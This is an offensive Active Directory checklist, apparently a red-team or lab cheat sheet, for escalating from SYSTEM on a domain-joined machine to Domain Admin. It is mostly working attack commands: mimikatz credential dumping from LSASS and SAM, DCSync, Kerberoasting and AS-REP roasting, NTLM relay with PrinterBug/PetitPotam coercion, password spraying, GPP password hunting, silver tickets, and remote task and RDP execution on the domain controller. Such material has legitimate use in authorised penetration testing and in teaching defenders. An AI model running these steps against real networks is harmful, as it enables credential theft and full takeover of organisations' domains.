# AD Lateral Movement & Privilege Escalation Checklist

When you have SYSTEM on a domain-joined machine but need DA access to the DC.

## Prerequisites Check
- [ ] Machine account NTLM hash (from LSASS: `sekurlsa::logonpasswords`)
- [ ] LSA secrets (`lsadump::secrets` → DPAPI_SYSTEM, $MACHINE.ACC)
- [ ] Domain SID, DC hostname, domain FQDN
- [ ] Cached Kerberos tickets (`sekurlsa::tickets`)
- [ ] All local user hashes (SAM dump)

## Attack Paths (ordered by likelihood of success)

### 1. DCSync (if machine has replication rights)
```
lsadump::dcsync /domain:X /user:Administrator
```
Error 0x20f7 = insufficient rights. Move on.

### 2. Kerberoasting (any domain user creds)
```
([adsisearcher]'(&(objectClass=user)(servicePrincipalName=*))').FindAll()
```
If user SPNs found → request TGS → offline crack.

### 3. AS-REP Roasting
UAC 4194304 (DONT_REQ_PREAUTH) → request AS-REP → offline crack.

### 4. RBCD (needs WRITE on target computer AD object)
Requirements: GenericAll/GenericWrite/WriteDACL on DC$ object.
Check: `rbcd.py -action read -delegate-to 'DC$' 'domain/user:pass@DC'`
Note: Machine accounts CANNOT write to other computers' AD objects by default.
SetInfo() may return silently without error but NOT persist — always verify with read-back.

### 5. Constrained/Unconstrained Delegation
Check: `userAccountControl` flags (524288=TRUSTED_FOR_DELEGATION, 16777216=TRUSTED_TO_AUTH_FOR_DELEGATION)
Check: `msDS-AllowedToDelegateTo` attribute on compromised machine.

### 6. NTLM Relay (coerce DC auth → relay to LDAP for RBCD/DCSync)
Setup: ntlmrelayx.py on listener → coerce DC via PrinterBug/PetitPotam.
Note: impacket ntlmrelayx may segfault on minimal installs. Use full pip install.
Coercion methods: misc::spooler /server:DC /connect:LISTENER, misc::efs (PetitPotam).

### 7. Password Spray Domain Admins
Try cracked passwords against all DA accounts. Common reuse in labs.

### 8. GPP Passwords in SYSVOL
```
smbclient //DC/SYSVOL -U 'domain/user%pass' -c "recurse ON; dir"
```
Look for Groups.xml, ScheduledTasks.xml with cpassword attributes.

### 9. Shadow Credentials (needs WRITE on user object)
Add msDS-KeyCredentialLink → request TGT with certificate.
Machine accounts usually can't write to user objects.

### 10. Silver Ticket (needs target service account hash)
For CIFS/DC: need DC$ machine NTLM. For LDAP/DC: same.
If you HAVE the DC machine hash → forge ticket as DA to any service.

### 11. WinRM/PSRemoting (port 5985)
Requires user to be in "Remote Management Users" or local admin on target.
TrustedHosts must include target IP or use Kerberos (hostname) auth.

### 12. Scheduled Task on DC
`schtasks /create /s DC /u domain\user /p pass /ru SYSTEM ...`
Requires admin rights on DC — rarely works with normal user.

### 13. RDP + Command Execution
If user is in "Remote Desktop Users": xfreerdp with Xvfb for headless execution.
`xvfb-run xfreerdp /v:DC /u:domain\\user /p:pass /cert:ignore +auth-only`
Note: /app mode unreliable for command execution via RDP.

## Network Connectivity Matrix (verify first!)
From each pivot host, check which ports reach DC:
```python
for port in [445, 5985, 135, 3389, 389, 88, 53, 1433]:
    socket.connect_ex((DC_IP, port))
```
SMB (445) may be filtered from external but open between domain hosts.

## Key Lessons (SecOps June 2026)
- Machine accounts (SYSTEM) have LIMITED AD rights — can't DCSync, can't write to DC object, can't schedule tasks on DC
- RBCD SetInfo() silently fails without error — always verify with read-back
- DPAPI domain backup key requires DA rights to retrieve via RPC
- Zerologon is patched on Server 2022
- WinRM requires specific group membership, not just valid domain creds
- If all AD paths fail, look for: credential files, GPP, password reuse, service vulns
